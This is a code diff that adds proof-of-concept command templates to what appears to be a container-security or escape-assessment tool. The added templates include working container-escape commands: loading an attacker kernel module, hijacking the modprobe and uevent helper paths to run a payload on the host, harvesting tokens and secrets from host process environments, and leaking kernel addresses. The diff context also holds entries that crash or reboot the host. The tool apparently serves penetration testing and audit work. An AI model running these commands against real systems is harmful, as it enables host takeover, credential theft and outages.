@@ -39,13 +39,40 @@ POC_TEMPLATES: dict[str, str] = {
         "# Manipulate network routing to intercept traffic\nip route add {target_network} via {gateway} dev eth0"
     ),
     "cap_sys_rawio": ("# Direct disk read via raw I/O\ndd if=/dev/{host_device} of=/tmp/disk_dump bs=512 count=1024"),
+    "cap_sys_module": (
+        "# Load an attacker kernel module for ring-0 host code execution.\n"
+        "# Build a .ko whose init calls call_usermodehelper to run: {payload_command}\n"
+        "make -C /lib/modules/$(uname -r)/build M=/tmp modules && insmod /tmp/evil.ko"
+    ),
+    "cap_sys_boot": ("# Reboot the host node (DANGEROUS)\necho b > /proc/sysrq-trigger  # or: reboot(2)"),
+    "cap_perfmon": (
+        "# Open kernel perf events to leak addresses (KASLR bypass)\n"
+        "perf record -a -g sleep 1 2>/dev/null || echo 'use perf_event_open(2) directly'"
+    ),
+    "cap_syslog": (
+        "# Leak kernel pointers to defeat KASLR\ndmesg | grep -iE 'kasan|0xffffffff' | head; "
+        "grep -i kernel /proc/kallsyms | head"
+    ),
     # ── MOUNT ─────────────────────────────────────────────────────
     "docker_socket_mount": ("curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"),
+    "podman_sock_mount": ("curl -s --unix-socket /run/podman/podman.sock http://d/v4.0.0/libpod/containers/json"),
     "procfs_core_pattern": (
         "echo '|/tmp/payload.sh' > /proc/sys/kernel/core_pattern && "
         "echo '{payload_command}' > /tmp/payload.sh && "
         "chmod +x /tmp/payload.sh && "
         "sleep 1 && kill -SEGV $$"
+    ),
+    "procfs_modprobe_path": (
+        "# Repoint the modprobe helper, then trigger an auto-modprobe\n"
+        "echo -e '#!/bin/sh\\n{payload_command}' > /tmp/x.sh && chmod +x /tmp/x.sh && "
+        "echo /tmp/x.sh > /proc/sys/kernel/modprobe && "
+        "printf '\\xff\\xff\\xff\\xff' > /tmp/trigger && chmod +x /tmp/trigger && /tmp/trigger 2>/dev/null"
+    ),
+    "sysfs_uevent_helper": (
+        "# Repoint the uevent helper, then trigger a uevent\n"
+        "echo -e '#!/bin/sh\\n{payload_command}' > /tmp/x.sh && chmod +x /tmp/x.sh && "
+        "echo /tmp/x.sh > /sys/kernel/uevent_helper && "
+        "echo change > /sys/class/mem/null/uevent"
     ),
     "procfs_sysrq": ("# Trigger host kernel crash (DANGEROUS)\necho c > /proc/sysrq-trigger"),
     "sysfs_hugepages": (
@@ -169,6 +196,12 @@ POC_TEMPLATES: dict[str, str] = {
         "# Requires BuildKit < 0.12.5 / Docker < 25.0.2\n"
         "docker version 2>/dev/null | grep -i version || echo 'docker version unknown'"
     ),
+    "cve_2024_23653": (
+        "# CVE-2024-23653: BuildKit unchecked security.insecure entitlement\n"
+        "# A malicious build runs a privileged container and escapes to the host\n"
+        "# Requires BuildKit < 0.12.5 / Docker < 25.0.2\n"
+        "docker version 2>/dev/null | grep -i version || echo 'docker version unknown'"
+    ),
     "lsm_apparmor_unconfined": (
         "# AppArmor is unconfined — no MAC restrictions\ncat /proc/self/attr/current  # Should show 'unconfined'"
     ),
@@ -182,6 +215,10 @@ POC_TEMPLATES: dict[str, str] = {
         "https://kubernetes.default.svc/api/v1/namespaces"
     ),
     "k8s_kubelet_api": ("curl -sk https://{node_ip}:10250/pods"),
+    "host_pid_namespace": (
+        "# Shared host PID namespace — read host process secrets\n"
+        "ps -ef; for p in /proc/[0-9]*; do tr '\\0' '\\n' < $p/environ 2>/dev/null; done | grep -iE 'token|secret|key'"
+    ),
     "k8s_etcd_access": ('curl -sk https://{etcd_host}:2379/v3/kv/range -d \'{{"key": "L3JlZ2lzdHJ5"}}\''),
     "docker_api_unauth": ("curl -s --unix-socket /var/run/docker.sock http://localhost/images/json"),
     "cve_2025_23266": (
@@ -195,6 +232,12 @@ POC_TEMPLATES: dict[str, str] = {
     "cve_2024_0132": (
         "# CVE-2024-0132: NVIDIA Container Toolkit host filesystem access\n"
         "# Requires specially crafted container image targeting toolkit < 1.16.2\n"
+        "ls /dev/nvidia* 2>/dev/null\n"
+        "nvidia-container-toolkit --version 2>/dev/null || echo 'toolkit version unknown'"
+    ),
+    "cve_2024_0133": (
+        "# CVE-2024-0133: NVIDIA Container Toolkit symlink host file write\n"
+        "# Crafted image symlinks a mount target so the toolkit writes host files\n"
         "ls /dev/nvidia* 2>/dev/null\n"
         "nvidia-container-toolkit --version 2>/dev/null || echo 'toolkit version unknown'"
     ),
